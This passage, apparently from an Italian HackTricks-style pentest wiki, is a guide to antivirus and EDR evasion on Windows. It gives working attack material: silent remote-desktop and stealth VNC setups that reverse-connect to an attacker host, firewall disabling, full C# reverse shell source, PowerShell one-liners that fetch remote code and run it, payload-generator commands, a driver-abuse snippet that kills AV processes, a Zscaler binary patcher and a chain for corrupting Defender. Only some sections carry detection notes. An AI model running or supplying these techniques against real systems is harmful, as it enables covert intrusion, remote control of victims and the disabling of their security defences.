1. Download da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricare l'MSI.
2. Esegui l'installer silenziosamente sulla vittima (richiede privilegi amministrativi): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. Il wizard ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro fornito con alcune modifiche: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro --pin che permette di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso, a volte devi tenere conto di molteplici fonti di telemetria in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui opererai avrà i propri punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94), per avere una base sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo intervento di [@mariuszbit](https://twitter.com/mariuszbit) su Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** finché **non scopre quale parte Defender** considera malevola e te la segnala.\
Un altro strumento che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web aperto disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i bin downloads, non il setup)

**ON THE HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ all'interno della **victim**

#### **Reverse connection**

L'**attacker** dovrebbe **eseguire inside** il suo **host** il binario `vncviewer.exe -listen 5900` in modo da essere **preparato** a catturare una **reverse VNC connection**. Poi, inside la **victim**: Avvia il demone winvnc `winvnc.exe -run` e esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth devi evitare di fare le seguenti cose

- Non avviare `winvnc` se è già in esecuzione o innescherai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o farà aprire [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per l'aiuto o innescherai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **start the lister** con `msfconsole -r file.rc` e **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download automatico ed esecuzione:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta il suo **proprio driver vulnerabile ma *firmato*** e lo abusa per emettere operazioni privilegiate a livello kernel che anche i servizi AV in Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` dall’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver riporta una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come un **servizio kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo spazio utente.
3. **IOCTLs exposed by the driver**
| IOCTL code | Funzionalità                              |
|-----------:|-------------------------------------------|
| `0x99000050` | Terminare un processo arbitrario per PID (usato per terminare i servizi di Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario su disco |
| `0x990001D0` | Unload del driver e rimozione del servizio |

Esempio C minimale:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD salta completamente le protezioni in modalità utente; il codice che viene eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la lista di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi servizi *kernel* e generare allerta quando un driver viene caricato da una directory scrivibile da tutti o non è presente nella allow-list.  
•  Sorvegliare handle in modalità utente verso oggetti device personalizzati seguiti da chiamate sospette a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (viene inviato un booleano al server).  
2. Gli endpoint RPC interni validano solo che l’eseguibile che si connette sia **firmato da Zscaler** (via `WinVerifyTrust`).

Modificando quattro binari firmati su disco entrambe le meccaniche possono essere neutralizzate:

| Binary | Logica originale modificata | Risultato |
|--------|-----------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Ritorna sempre `1` così ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può bindarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Saltati |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di posture risultano **verde/conforme**.
* Binari non firmati o modificati possono aprire gli endpoint RPC su named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente lato client e semplici controlli di firma possano essere sconfitti con pochi patch di byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impone una gerarchia signer/level così che solo processi protetti di pari o superiore livello possano manomettersi a vicenda. In ottica offensiva, se puoi legittimamente avviare un binario abilitato PPL e controllarne gli argomenti, puoi convertire funzionalità benign (es. logging) in una primitive di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.

Cosa fa sì che un processo venga eseguito come PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp non può analizzare percorsi contenenti spazi; usare percorsi 8.3 (short) per puntare a posizioni normalmente protette.

8.3 short path helpers
- Elencare i nomi brevi: `dir /x` in ogni parent directory.
- Derivare il percorso corto in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avviare la LOLBIN capace di PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (e.g., CreateProcessAsPPL).
2) Passare l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (e.g., Defender Platform). Usare nomi 8.3 se necessario.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto che `ClipUp` scrive oltre alla posizione; la primitiva è adatta a corrompere piuttosto che a iniettare contenuti in modo preciso.
- Richiede local admin/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: l'obiettivo non deve essere aperto; l'esecuzione all'avvio evita i lock sui file.

Rilevazioni
- Creazione di processi di `ClipUp.exe` con argomenti insoliti, specialmente se parentati da launcher non standard, intorno all'avvio.
- Nuovi servizi configurati per l'auto-avvio di binari sospetti e che si avviano sistematicamente prima di Defender/AV. Indagare la creazione/modifica del servizio prima dei fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sulle directory dei binari/Platform di Defender; creazioni/modifiche di file inaspettate da processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali parent; bloccare l'invocazione di ClipUp al di fuori di contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi ad auto-avvio e monitorare la manipolazione dell'ordine di avvio.
- Abilitare Defender tamper protection e le protezioni di early-launch; indagare errori di avvio che indicano corruzione di binari.
- Valutare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano tool di sicurezza se compatibile con l'ambiente (test approfonditi).

Riferimenti per PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Riferimenti

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
